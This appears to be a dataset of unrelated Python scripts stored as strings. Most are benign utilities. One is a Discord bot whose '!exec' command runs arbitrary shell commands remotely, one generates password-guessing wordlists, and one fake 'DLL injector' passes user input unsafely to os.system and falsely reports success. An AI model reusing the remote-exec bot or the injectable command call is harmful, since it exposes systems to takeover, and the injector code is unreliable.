    "import re\n\n\nclass Measure:\n\t__EMUS_TO_IN = 914400\n\t__EMUS_TO_CM = 360000\n\t__EMUS_TO_MM = 36000\n\t__EMUS_TO_PT = 12700\n\t__EMUS_TO_PX = 12700 * 72 / 96\n\t__EMUS_TO_PC = 152400\n\t__EMUS_TO_PI = 152400\n\t__EMUS_TO_HPS = 6350\n\t__EMUS_TO_TWIPS = 635\n\t__EMUS_TO_PT_8 = 1587.5  # EighthPoint\n\t\n\t# mm | cm | in | pt | pc | pi\n\tdef __init__(self, value):\n\t\tself._emus = value\n\t\n\t@classmethod\n\tdef PX(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_PX)\n\t\n\t@classmethod\n\tdef EMUS(cls, value):\n\t\treturn cls(value)\n\t\n\t@classmethod\n\tdef INCH(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_IN)\n\t\n\t@classmethod\n\tdef CM(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_CM)\n\t\n\t@classmethod\n\tdef MM(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_MM)\n\t\n\t@classmethod\n\tdef PT(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_PT)\n\t\n\t@classmethod\n\tdef PT_8(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_PT_8)\n\t\n\t@classmethod\n\tdef PC(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_PC)\n\t\n\t@classmethod\n\tdef PI(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_PI)\n\t\n\t@classmethod\n\tdef HPS(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_HPS)\n\t\n\t@classmethod\n\tdef TWIPS(cls, value):\n\t\treturn cls(value * cls.__EMUS_TO_TWIPS)\n\t\n\t@property\n\tdef px(self):\n\t\treturn self.emus / self.__EMUS_TO_PX\n\t\n\t@px.setter\n\tdef px(self, value):\n\t\tself.emus = value * self.__EMUS_TO_PX\n\t\n\t@property\n\tdef pt(self):\n\t\treturn self.emus / self.__EMUS_TO_PT\n\t\n\t@pt.setter\n\tdef pt(self, value):\n\t\tself.emus = value * self.__EMUS_TO_PT\n\t\n\t@property\n\tdef inch(self):\n\t\treturn self.emus / self.__EMUS_TO_IN\n\t\n\t@inch.setter\n\tdef inch(self, value):\n\t\tself.emus = value * self.__EMUS_TO_IN\n\t\n\t@property\n\tdef cm(self):\n\t\treturn self.emus / self.__EMUS_TO_CM\n\t\n\t@cm.setter\n\tdef cm(self, value):\n\t\tself.emus = value * self.__EMUS_TO_CM\n\t\n\t@property\n\tdef mm(self):\n\t\treturn self.emus / self.__EMUS_TO_MM\n\t\n\t@mm.setter\n\tdef mm(self, value):\n\t\tself.emus = value * self.__EMUS_TO_MM\n\t\n\t@property\n\tdef pc(self):\n\t\treturn self.emus / self.__EMUS_TO_PC\n\t\n\t@pc.setter\n\tdef pc(self, value):\n\t\tself.emus = value * self.__EMUS_TO_PC\n\t\n\t@property\n\tdef pi(self):\n\t\treturn self.emus / self.__EMUS_TO_PI\n\t\n\t@pi.setter\n\tdef pi(self, value):\n\t\tself.emus = value * self.__EMUS_TO_PI\n\t\n\t@property\n\tdef hps(self):\n\t\treturn int(self.emus / self.__EMUS_TO_HPS)\n\t\n\t@hps.setter\n\tdef hps(self, value):\n\t\tself.emus = value * self.__EMUS_TO_HPS\n\t\n\t@property\n\tdef twips(self):\n\t\treturn self.emus / self.__EMUS_TO_TWIPS\n\t\n\t@twips.setter\n\tdef twips(self, value):\n\t\tself.emus = value * self.__EMUS_TO_TWIPS\n\t\n\t@property\n\tdef pt_8(self):\n\t\treturn self.emus / self.__EMUS_TO_PT_8\n\t\n\t@pt_8.setter\n\tdef pt_8(self, value):\n\t\tself.emus = value * self.__EMUS_TO_PT_8\n\t\n\t@property\n\tdef unsigned(self):\n\t\treturn self.emus >= 0\n\t\n\t@property\n\tdef emus(self):\n\t\treturn self._emus\n\t\n\t@emus.setter\n\tdef emus(self, value):\n\t\tself._emus = value\n\t\n\tdef __str__(self):\n\t\treturn f\"{self.pt}pt\"\n\t\n\tdef __eq__(self, other):\n\t\tif isinstance(other, Measure):\n\t\t\treturn self.emus == other.emus\n\t\telse:\n\t\t\treturn False\n\n\nMeasureZero = Measure.EMUS(0)\n\n_regx_color_hex = re.compile(r'^#?([0-9a-fA-F]{6})$')\n\n\ndef Color(*args):\n\tif len(args) == 1:\n\t\tif isinstance(args[0], tuple):\n\t\t\tr, g, b = args[0]\n\t\telif isinstance(args[0], str):\n\t\t\tif args[0] == 'auto':\n\t\t\t\treturn args[0]\n\t\t\tvalue = args[0]\n\t\t\tres = _regx_color_hex.match(value)\n\t\t\txml_value = res.group(1).upper()\n\t\t\treturn xml_value\n\t\telse:\n\t\t\tassert False, f\"{type(args[0])}<{args[0]}> is not a valid Color value\"\n\telse:\n\t\tr, g, b = args\n\treturn f'{r:02x}{g:02x}{b:02x}'\n\n\nColorAuto = 'auto'\n",
    "import itertools\nimport time\n\n# Define Leet Speak substitutions with multiple variations\nleet_substitutions = {\n    'a': ['4', '@'],\n    'e': ['3', '\u20ac'],\n    'i': ['1', '!', '|'],\n    'l': ['1', '|'],\n    'o': ['0'],\n    's': ['5', '$'],\n    'z': ['2'],\n    't': ['7']\n}\n\ndefault_fix = ['!', '.']\n\ndef generate_wordlist(words):\n    wordlist = list(words)\n    for idx, word in enumerate(itertools.permutations(words)):\n        joined_word = ''.join(word)\n        wordlist.append(joined_word)\n    return wordlist\n\ndef generate_wordlist_with_leet(words):\n    wordlist = list(words)\n    for word in words:\n        modified_words = set()  # To store unique modified words for each original word\n        for l in range(1, len(word)):\n            for subset in itertools.combinations(range(len(word)), l):\n                for substitutions in itertools.product(*[leet_substitutions.get(word[i].lower(), [word[i]]) for i in subset]):\n                    temp_word = list(word)\n                    for i, substitution in zip(subset, substitutions):\n                        temp_word[i] = substitution\n                    modified_words.add(\"\".join(temp_word))\n        wordlist.extend(modified_words)  # Extend the wordlist with unique modified words\n    return wordlist\n    \n    \ndef generate_wordlist_with_uppercase(words):\n    wordlist = list(words)\n    combinations_count = sum(len(list(itertools.combinations(range(len(word)), l))) for word in words for l in range(1, len(word)))\n    print(\"Generating wordlist with uppercase... This may take a moment.\")\n    start_time = time.time()\n    idx = 0\n    for word in words:\n        modified_words = set()  # To store unique modified words for each original word\n        for l in range(1, len(word)):\n            for subset in itertools.combinations(range(len(word)), l):\n                idx += 1\n                progress = idx / combinations_count * 100\n                elapsed_time = time.time() - start_time\n                time_remaining = (elapsed_time / idx) * (combinations_count - idx)\n                print(f\"Progress: {progress:.2f}%  Estimated time remaining: {time_remaining:.2f} seconds\", end='\\r')\n                for uppercases in itertools.product(*[(char.upper(), char.lower()) if char.isalpha() else (char,) for char in word]):\n                    temp_word = [uppercases[i] if i in subset else char for i, char in enumerate(word)]\n                    modified_words.add(\"\".join(temp_word))\n        # Add a modified version of the word with all characters uppercase\n        modified_words.add(word.upper())\n        wordlist.extend(modified_words)  # Extend the wordlist with unique modified words\n    print(\"\\nWordlist with uppercase generation complete!\")\n    return wordlist\n    \ndef generate_wordlist_with_appendix(wordlist, fix, choice):\n    modified_wordlist = set()\n    if choice == \"p\":\n        for word in wordlist:\n            for append in fix:\n                modified_wordlist.add(append + word)\n    elif choice == \"s\":\n        for word in wordlist:\n            for append in fix:\n                modified_wordlist.add(word + append)\n    elif choice == \"b\":\n        for word in wordlist:\n            for append in fix:\n                modified_wordlist.add(word + append)\n                modified_wordlist.add(append + word)\n    \n    return modified_wordlist\n    \ndef save_wordlist(wordlist, filename):\n    with open(filename, 'w') as file:\n        for word in wordlist:\n            file.write(word + '\\n')\n    print(\"Wordlist saved successfully!\")\n\ndef main():\n    print(\"\\nWelcome to the Wordlist Generator!\")\n    while True:\n        print(\"Choose an option:\")\n        print(\"1. Merge two or more txt wordlist files into one\")\n        print(\"2. Create a new wordlist\")\n        print(\"3. Exit\")\n    \n        choice = input(\"\\nEnter the number of the option you want to select: \")\n\n        if choice == '1':\n            merge_wordlists()\n        elif choice == '2':\n            create_wordlist()\n        elif choice == '3':\n            print(\"Exiting program. Goodbye!\")\n            break\n        else:\n            print(\"Invalid option. Please choose a valid option.\")\n\ndef merge_wordlists():\n    # Get input filenames\n    filenames = input(\"Enter the filenames of the wordlist files you want to merge (separated by space): \").split()\n    final_wordlist = set()\n\n    # Read wordlists from files and merge them\n    for filename in filenames:\n        try:\n            with open(filename, 'r') as file:\n                words = file.read().split()\n                final_wordlist.update(words)\n        except FileNotFoundError:\n            print(f\"File '{filename}' not found. Skipping...\")\n\n    # Save the merged wordlist to a file\n    filename = input(\"Enter the filename for the merged wordlist: \")\n    save_wordlist(final_wordlist, filename)\n\ndef create_wordlist():\n    # Get words from user input\n    words = input(\"Enter words (separated by space): \").lower().split()\n\n    # Menu for choosing wordlist generation options\n    prin",
    "import torch\n\nfrom fp_formats import _assert_equals, dtype_to_interesting_values\n\ndef test_fp32():\n    dtype = torch.float\n    interesting_values = dtype_to_interesting_values[dtype]\n    for fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, _notes in interesting_values:\n        _assert_equals(fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, dtype)\n\ndef test_bf16():\n    dtype = torch.bfloat16\n    interesting_values = dtype_to_interesting_values[dtype]\n    for fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, _notes in interesting_values:\n        _assert_equals(fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, dtype)\n\ndef test_fp16():\n    dtype = torch.float16\n    interesting_values = dtype_to_interesting_values[dtype]\n    for fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, _notes in interesting_values:\n        _assert_equals(fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, dtype)\n\ndef test_float8_e4m3fn():\n    dtype = torch.float8_e4m3fn\n    interesting_values = dtype_to_interesting_values[dtype]\n    for fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, _notes in interesting_values:\n        _assert_equals(fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, dtype)\n\ndef test_float8_e5m2():\n    dtype = torch.float8_e5m2\n    interesting_values = dtype_to_interesting_values[dtype]\n    for fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, _notes in interesting_values:\n        _assert_equals(fp_ref, s_enc_ref, e_enc_ref, m_enc_ref, dtype)\n",
    "import os\nimport xml.etree.ElementTree as ET\n\n\nclass XMLEditor:\n    def __init__(self, xml_path: str):\n        ET.register_namespace('', 'http://www.tei-c.org/ns/1.0')\n        self.xml_path: str = xml_path\n        self.name = os.path.basename(xml_path)\n        self.tree = ET.parse(xml_path)\n        self.root = self.tree.getroot()\n\n    def get_elements_by_tags(self, tags: list[str], ignore_tags: list[str] = None) -> list[ET.Element]:\n        \"\"\"\n        Returns list of elements with given tags\n        :param tags: list[str]\n        :param ignore_tags: list[str]\n        :return: list[ET.Element]\n        \"\"\"\n        return self._get_elements_by_tags(self.root, tags, [], ignore_tags)\n\n    def _get_elements_by_tags(self, element: ET.Element, tags: list[str], result: list[ET.Element],\n                              ignore_tags: list[str] = None) -> list[ET.Element]:\n        \"\"\"\n        Recursive function to get elements by tags.\n        :param element: ET.Element\n        :param tags: list[str]\n        :param result: list[ET.Element]\n        :param ignore_tags: list[str]\n        \"\"\"\n\n        for child in element:\n            # ignores given tags and their children\n            if ignore_tags and child.tag in ignore_tags:\n                continue\n\n            # collects elements with given tags\n            if child.tag in tags:\n                result.append(child)\n\n            self._get_elements_by_tags(child, tags, result, ignore_tags)\n\n        return result\n\n    def save(self, folder: str):\n        \"\"\"Save the xml file to the folder.\"\"\"\n        self.tree.write(os.path.join(folder, self.name), encoding='utf-8')\n\n    def add_coordinates_to_sentences(self):\n        \"\"\"\n        Adds coordinates to sentences\n        \"\"\"\n        sentences = self.get_elements_by_tags(['{http://www.tei-c.org/ns/1.0}s'])\n        for sentence in sentences:\n            # get first and last word in sentence\n            words = sentence.findall('.//{http://www.tei-c.org/ns/1.0}w')\n            if not words:\n                continue\n\n            firstWord = words[0]\n            lastWord = words[-1]\n\n            # get attributes of from first and last word to put in sentence\n            fromPage = firstWord.get('fromPage')\n            toPage = lastWord.get('toPage')\n            x1 = firstWord.get('x1')\n            y1 = firstWord.get('y1')\n            x2 = lastWord.get('x2') if lastWord.get('isOnMultipleLines') == 'False' else lastWord.get('x4')\n            y2 = lastWord.get('y2') if lastWord.get('isOnMultipleLines') == 'False' else lastWord.get('y4')\n\n            # add attributes to sentence\n            sentence.set('fromPage', fromPage)\n            sentence.set('toPage', toPage)\n            sentence.set('x1', x1)\n            sentence.set('y1', y1)\n            sentence.set('x2', x2)\n            sentence.set('y2', y2)\n\n    def add_coordinates_to_segments(self):\n        \"\"\"\n        Adds coordinates to segments\n        \"\"\"\n        segments = self.get_elements_by_tags(['{http://www.tei-c.org/ns/1.0}seg'])\n        for segment in segments:\n            # get first and last sentence in segment\n            sentences = segment.findall('.//{http://www.tei-c.org/ns/1.0}s')\n            if not sentences:\n                continue\n\n            firstSentence = sentences[0]\n            lastSentence = sentences[-1]\n\n            # get attributes of from first and last sentence to put in segment\n            fromPage = firstSentence.get('fromPage')\n            toPage = lastSentence.get('toPage')\n            x1 = firstSentence.get('x1')\n            y1 = firstSentence.get('y1')\n            x2 = lastSentence.get('x2')\n            y2 = lastSentence.get('y2')\n\n            # add attributes to segment\n            segment.set('fromPage', fromPage)\n            segment.set('toPage', toPage)\n            segment.set('x1', x1)\n            segment.set('y1', y1)\n            segment.set('x2', x2)\n            segment.set('y2', y2)",
    "import heapq\nimport tkinter as tk\nfrom tkinter import messagebox\n\n# 24. Problema cavalerilor. La curtea regelui Arthur s-au adunat n cavaleri. Fiecare dintre\n# ei are printre cei prezen\u0163i cel pu\u0163in un du\u015fman. Verifica\u0163i dac\u0103 Merlin, consilierul\n# regelui, poate s\u0103 \u00eei a\u015feze pe cavaleri la o mas\u0103 rotund\u0103 astfel \u00eenc\u00e2t nici unul dintre ei\n# s\u0103 nu fie al\u0103turi de vreun du\u015fman al s\u0103u.\n# Rezolva\u0163i problema folosind strategia de c\u0103utare A*.\n\n# Constructor n - nr. Cavaleri, enemies - dictionar ce contine dusmanii fiecarui cavaler\n\nfilename = \"date10cav.txt\"\n\nclass KnightProblem:\n    def __init__(self, n, enemies):\n        self.n = n\n        self.enemies = enemies\n\n\n# Verificare solutie valida - primeste o lista solution - pt fiecare cavaler din lista se verifica\n# daca are dusman in stanga si dreapta\n\n    def is_valid_solution(self, solution):\n        for i in range(self.n):\n            if solution[i] in self.enemies[solution[(i - 1) % self.n]] or solution[i] in self.enemies[solution[(i + 1) % self.n]]:\n                return False\n        return True\n\n# Primeste o permutare a cavalerilor si calculeaza o euristica simpla bazata pe nr de cavaleri care sunt langa un dusman\n# Cu cat h este mai mic cu atat solutia este considerata mai buna\n    def heuristic(self, solution):\n        h = 0\n        for i in range(self.n):\n            if solution[i] in self.enemies[solution[(i - 1) % self.n]] or solution[i] in self.enemies[solution[(i + 1) % self.n]]:\n                h += 1\n        return h\n\n# Metoda A*\n    def a_star_search(self):\n        # Initializare starea initiala, lista deschisa, multime inchisa\n        start_state = tuple(range(self.n))\n        open_list = [(self.heuristic(start_state), start_state)]\n        closed_set = set()\n\n        # Cat timp ce lista deschisa nu este goala,se extrage starea cu cel mai mic cost estimat.\n        while open_list:\n            _, state = heapq.heappop(open_list)\n\n            # Daca state este o solutie vaida, aceasta este returnata\n            if self.is_valid_solution(state):\n                return state\n\n            # Altfel, state este adaugata in multimea inchisa\n            closed_set.add(state)\n\n\n            neighbors = self.get_neighbors(state)\n\n            # Vecini sunt generati si adaugati in lista deschisa daca nu se afla in multimea inchisa\n            for neighbor in neighbors:\n                if neighbor not in closed_set:\n                    heapq.heappush(open_list, (self.heuristic(neighbor) + len(state), neighbor))\n\n        return None\n\n    # get_neighbors - primeste o permutare a cavalerilor si returneaza toti vecinii acestei permutari\n    def get_neighbors(self, state):\n        neighbors = []\n        for i in range(self.n):\n            for j in range(i + 1, self.n):\n                # Obtinut prin interschimbarea pozitiilor a doi cavaleri in permutare\n                neighbor = list(state)\n                neighbor[i], neighbor[j] = neighbor[j], neighbor[i]\n                neighbors.append(tuple(neighbor))\n        return neighbors\n\n\ndef load_data_from_file(filename):\n    with open(filename, 'r') as file:\n        lines = file.readlines()\n\n    # Eliminare linii goale din fisier\n    lines = [line.strip() for line in lines if line.strip()]\n\n    # Verificare daca contine date valide\n    if len(lines) == 0:\n        print(\"Fisierul este gol sau nu contine date valide!\")\n        exit()\n\n    n = int(lines[0])\n    enemies = {}\n    for line in lines[1:]:\n        parts = line.strip().split(':')\n        knight = int(parts[0])\n        enemy_list = list(map(int, parts[1].split(',')))\n        enemies[knight] = enemy_list\n\n    return n, enemies\n\n\n\ndef solve_problem():\n    fn = filename\n    n, enemies = load_data_from_file(fn)\n\n    if n is None or enemies is None:\n        return\n\n    knight_problem = KnightProblem(n, enemies)\n    solution = knight_problem.a_star_search()\n\n    if solution:\n        messagebox.showinfo(\"Solutie gasita\", f\"O solutie posibila este: {solution}\")\n    else:\n        messagebox.showinfo(\"Informatie\", \"Nu exista solutie pentru aceasta configuratie.\")\n\n\ndef display_file_content():\n    fn = filename\n    with open(fn, 'r') as file:\n        file_content = file.read()\n    text_box.delete(\"1.0\", \"end\")\n    text_box.insert(\"1.0\", file_content)\n\n\n# Interfata grafica\nroot = tk.Tk()\nroot.title(\"Problema Cavalerilor\")\n\n# Butonul pentru rezolvarea problemei\nsolve_button = tk.Button(root, text=\"Rezolva problema\", command=solve_problem)\nsolve_button.pack()\n\n# Butonul pentru afisarea con\u021binutului fisierului\ndisplay_button = tk.Button(root, text=\"Afiseaza continutul fisierului\", command=display_file_content)\ndisplay_button.pack()\n\n# Campul de text pentru afisarea continutului fisierului\ntext_box = tk.Text(root, height=10, width=50)\ntext_box.pack()\n\nroot.mainloop()\n\n",
    "import discord\nfrom discord.ext import commands\nimport subprocess\nimport logging\n\n# Setup basic logging\nlogging.basicConfig(level=logging.INFO)\n\nintents = discord.Intents.default()\nintents.message_content = True  # Enable message content intent\n\nTOKEN = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\nbot = commands.Bot(command_prefix='!', intents=intents)\n\n@bot.event\nasync def on_ready():\n    logging.info(f'Logged in as {bot.user.name}')\n    channel_id = 1224502675148771348  # Change this to your desired channel ID\n    channel = bot.get_channel(channel_id)\n    if channel:\n        await channel.send(\"I am online\")\n\n@bot.command(name='exec')\nasync def exec_command(ctx, *, command):\n    logging.info(f'Executing command: {command}')\n    try:\n        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=30, universal_newlines=True)\n    except subprocess.CalledProcessError as e:\n        error_message = f'Error:\\n```\\n{clean_up_output(e.output)}\\n```'\n        # Truncate the message to 1950 characters if it's too long\n        if len(error_message) > 1950:\n            await ctx.send(f'{clean_up_output(error_message)}...')\n        else:\n            await ctx.send(error_message)\n        logging.error(f'Command error: {clean_up_output(e.output)}')\n    except Exception as e:\n        await ctx.send(f'An error occurred: {e}')\n        logging.exception('Unexpected error')\n    else:\n        # If there's output, truncate if necessary and send it\n        if output:\n            message = f'Output:\\n```\\n{clean_up_output(output)}\\n```'\n            if len(message) > 1950:\n                await ctx.send(f'{message}...')\n            else:\n                await ctx.send(message)\n            logging.info(f'Command output: {clean_up_output(output)}')\n        else:\n            await ctx.send('Command executed successfully with no output.')\n            logging.info('Command executed successfully with no output.')\n\ndef clean_up_output(input_string):\n    return input_string.replace('`', \"'\").replace('\u0003',\"\")[:1947]\n\nbot.run(TOKEN)",
    "from utils import pre\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.optim as optim\r\nfrom torch.utils.data import Dataset, DataLoader\r\nimport numpy as np\r\nimport os\r\nfrom model import VCModel\r\n\r\n# use if training\r\n#pre.process('dataset', 'logs/', 'test')\r\n\r\nclass SpectrogramDataset(Dataset):\r\n    def __init__(self, specs_dir):\r\n        self.specs_dir = specs_dir\r\n        self.spec_files = [f for f in os.listdir(specs_dir) if f.endswith('.npy')]\r\n\r\n    def __len__(self):\r\n        return len(self.spec_files)\r\n\r\n    def __getitem__(self, idx):\r\n        spec_file = self.spec_files[idx]\r\n        spec_path = os.path.join(self.specs_dir, spec_file)\r\n        spec = np.load(spec_path)\r\n\r\n        if len(spec.shape) == 4:\r\n            spec = spec.transpose(0, 3, 1, 2)\r\n        spec = torch.tensor(spec, dtype=torch.float32)\r\n\r\n        return spec\r\n\r\ndef train_model(model, dataloader, num_epochs, save_path):\r\n    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\r\n    \r\n    model = model.to(device)\r\n    criterion = nn.MSELoss()\r\n    optimizer = optim.Adam(model.parameters(), lr=0.001)\r\n\r\n    for epoch in range(num_epochs):\r\n        running_loss = 0.0\r\n\r\n        for i, data in enumerate(dataloader, 0):\r\n            inputs = data.unsqueeze(1).to(device)\r\n            targets = data.to(device)\r\n            if inputs.shape != targets.shape:\r\n                inputs = inputs.view(targets.shape)\r\n            inputs = inputs.squeeze(1)\r\n            outputs = model(inputs)\r\n            optimizer.zero_grad()\r\n            loss = criterion(outputs, targets)\r\n            loss.backward()\r\n            optimizer.step()\r\n            running_loss += loss.item()\r\n\r\n            if i % 10 == 9:\r\n                print('[%d, %5d] loss: %.3f' % (epoch + 1, i + 1, running_loss / 10))\r\n                running_loss = 0.0\r\n\r\n    torch.save(model.state_dict(), save_path)\r\n    print('Finished Training')\r\n\r\nspecs_dir = 'logs/test/specs/'\r\ndataset = SpectrogramDataset(specs_dir)\r\ndataloader = DataLoader(dataset, batch_size=32, shuffle=True)\r\n\r\nmodel = VCModel()\r\n\r\ntrain_model(model, dataloader, num_epochs=10, save_path='model.pth')\r\n",
    "from pytube import YouTube\n\nprint ('''     .::!!!!!!!:.\n  .!!!!!:.                        .:!!!!!!!!!!!!\n  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$\n      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P\n      $$$$$##WX!:      .<!!!!UW$$$$\"  $$$$$$$$#\n      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*\n      ^$$$B  $$$$\\     $$$$$$$$$$$$   d$$R\"\n        \"*$bd$$$$      '*$$$$$$$$$$$o+#\"\n        _\n     /\\                        (_)\n    /  \\   _ __  ___  __ _ _ __ _\n   / /\\ \\ | '_ \\/ __|/ _` | '__| |\n  / ____ \\| | | \\__ \\ (_| | |  | |\n /_/    \\_\\_| |_|___/\\__,_|_|  |_| \n \n   Author : AnsariHacker07\n   github : https://github.com/AnsariHacker07\n   Instagram : https://instagram.com/hacker_ansari_07\n  \n       ''')\n\n# Example usage\nurl = input ('url : ')\nyoutube = YouTube(url)\n\n# Print video title\nprint(\"Video Title: \" + youtube.title)\n\n# Select video format\nvideo = youtube.streams.filter(file_extension='mp4').first()\n\n# Define download path\ndownload_path = \"/storage/emulated/0/\"\n\n# Download video\nvideo.download(download_path)\n\n# Print success message\nprint(\"Video downloaded successfully\")\n",
    "from rentals import Rentals\nprint(\"choose filters you want. use numbers as your answers.\")\nprint(\"your answer has to be in numbers. for example if you want filters 1,2 and 4 your answer has to be: 124 , order doesn't matter\")\nprint(\"the min price has to be atleast 0 and the max price has to be atmost 1,000,000\")\nprint(\"locations wanted to find has to be in range of 1 to 50.\")\nprint(\"you can choose not to have any filters for each part by writing 'no'. \")\nlocations_wanted_to_find = input('how many locations do you want to get the average prive from ?: ')\ntarget = input(\"which city is your target ? (1=Toronto , 2=Vancouver , 3=Richmond hill)(default is Toronto): \")\nbeds = input(\"how many beds ? (0=Studio , 1=1bed , 2=2beds , 3=3beds , 4=+4beds): \")\nbaths = input(\"how many baths ? (1=1bath , 2=2baths , 3=3baths , 4=4baths , 5=+5baths): \")\nmin_price = input(\"what's the min price ? (atleast 0): \")\nmax_price = input(\"what's the max price ? (atmost 10000): \")\ntype_of_the_location = input(\"what type ? (1=Apartment , 2=Condo , 3=House , 4=Room , 5=Townhouse , 6=Other): \")\npets = input(\"do you have pets ? (1=dog , 2=cat): \")\navailability = input(\"be available ? (1=only if it is available): \")\nlaundry = input(\"laundry ? (1=In unit , 2=In building): \")\nAC = input(\"AC ? (1=only if it has AC): \")\ndishW = input(\"dish washer ? (1=only if it has dish washer): \")\ngarage_parking = input(\"garage/parking ? (1=only if it has garage/parking): \")\nprint('___________________________')\ninstance = Rentals(\n    locations_wanted_to_find,\n    beds,\n    baths,\n    min_price,\n    max_price,\n    type_of_the_location,\n    pets,\n    availability,\n    laundry,\n    AC,\n    dishW,\n    garage_parking,\n    target\n    )\nprice_list = instance.get_price_list()\naverage = instance.get_average(price_list)\nprint(price_list)\nprint(average)",
    "import sys\r\nimport psutil\r\nfrom PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLabel, QVBoxLayout, QComboBox, QMessageBox, QFileDialog\r\nfrom PyQt5.QtGui import QIcon\r\n\r\nclass DLLInjector(QWidget):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.initUI()\r\n\r\n    def initUI(self):\r\n        self.setWindowTitle('Guns DLL Injector')\r\n        self.setWindowIcon(QIcon('icon.png'))\r\n        self.setGeometry(100, 100, 400, 200)\r\n\r\n        self.lbl_dll = QLabel('Select the DLL file:', self)\r\n        self.btn_dll = QPushButton('Select', self)\r\n        self.btn_dll.clicked.connect(self.openDLLDialog)\r\n\r\n        self.lbl_exe = QLabel('Select the EXE process:', self)\r\n        self.combo_exe = QComboBox(self)\r\n        self.populateEXEComboBox()\r\n\r\n        self.btn_inject = QPushButton('Inject DLL', self)\r\n        self.btn_inject.clicked.connect(self.injectDLL)\r\n\r\n        layout = QVBoxLayout()\r\n        layout.addWidget(self.lbl_dll)\r\n        layout.addWidget(self.btn_dll)\r\n        layout.addWidget(self.lbl_exe)\r\n        layout.addWidget(self.combo_exe)\r\n        layout.addWidget(self.btn_inject)\r\n\r\n        self.setLayout(layout)\r\n\r\n        self.selected_dll = \"\"\r\n        self.selected_exe = \"\"\r\n\r\n        self.setStyleSheet(\"\"\"\r\n            QWidget {\r\n                background-color: #f0f0f0;\r\n            }\r\n            QLabel {\r\n                font-size: 14px;\r\n            }\r\n            QPushButton, QComboBox {\r\n                background-color: #4CAF50;\r\n                color: white;\r\n                font-size: 14px;\r\n                border: none;\r\n                border-radius: 5px;\r\n                padding: 8px;\r\n            }\r\n            QPushButton:hover, QComboBox:hover {\r\n                background-color: #45a049;\r\n            }\r\n            QPushButton:pressed, QComboBox:pressed {\r\n                background-color: #3c8039;\r\n            }\r\n        \"\"\")\r\n\r\n    def populateEXEComboBox(self):\r\n        self.combo_exe.clear()\r\n        for proc in psutil.process_iter(['pid', 'name']):\r\n            if proc.info['name'].endswith('.exe'):\r\n                self.combo_exe.addItem(proc.info['name'])\r\n\r\n    def openDLLDialog(self):\r\n        self.selected_dll, _ = QFileDialog.getOpenFileName(self,\"Select the DLL file\", \"\",\"DLL Files (*.dll);;All Files (*)\")\r\n\r\n    def injectDLL(self):\r\n        if not self.selected_dll or self.combo_exe.currentIndex() == -1:\r\n            QMessageBox.warning(self, 'Error', 'Please select DLL file and EXE process!')\r\n            return\r\n\r\n        selected_exe = self.combo_exe.currentText()\r\n\r\n        try:\r\n            import pyinstaller\r\n            pyinstaller.__path__  \r\n            import os\r\n            os.system(f'pyinstaller --add-data \"{self.selected_dll};.\" \"{selected_exe}\"')\r\n            QMessageBox.information(self, 'Sukces', 'Plik DLL zosta\u0142 pomy\u015blnie wstrzykni\u0119ty!')\r\n        except ImportError:\r\n            QMessageBox.critical(self, 'Error', 'The pyinstaller library was not installed. Please note the use of \"pip install pyinstaller\".')\r\n\r\nif __name__ == '__main__':\r\n    app = QApplication(sys.argv)\r\n    window = DLLInjector()\r\n    window.show()\r\n    sys.exit(app.exec_())\r\n",
    "import subprocess\nimport ctypes, sys\n\n# V\u00e9rifier si le script est ex\u00e9cut\u00e9 en tant qu'administrateur\ndef is_admin():\n    try:\n        return ctypes.windll.shell32.IsUserAnAdmin()\n    except:\n        return False\n\n# Fonction pour ex\u00e9cuter une commande PowerShell\ndef run_powershell_command(command):\n    subprocess.run([\"powershell\", \"-Command\", command], shell=True, check=True)\n\n# Liste des commandes \u00e0 ex\u00e9cuter\ncommands = [\n    \"powercfg -h off\",\n    \"netsh int tcp set global chimney=disabled\",\n    \"netsh int tcp set global rss=disabled\",\n    \"netsh int tcp set global netdma=disabled\"\n]\n\n# V\u00e9rifier si l'utilisateur a les privil\u00e8ges d'administration\nif is_admin():\n    # Ex\u00e9cuter chaque commande\n    for command in commands:\n        try:\n            run_powershell_command(command)\n            print(f\"Command executed successfully: {command}\")\n        except subprocess.CalledProcessError as e:\n            print(f\"Error executing command {command}: {e}\")\nelse:\n    # Si l'utilisateur n'est pas administrateur, demander \u00e0 \u00eatre ex\u00e9cut\u00e9 en tant qu'administrateur\n    print(\"Please run this script as administrator.\")\n    ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, __file__, None, 1)\n",
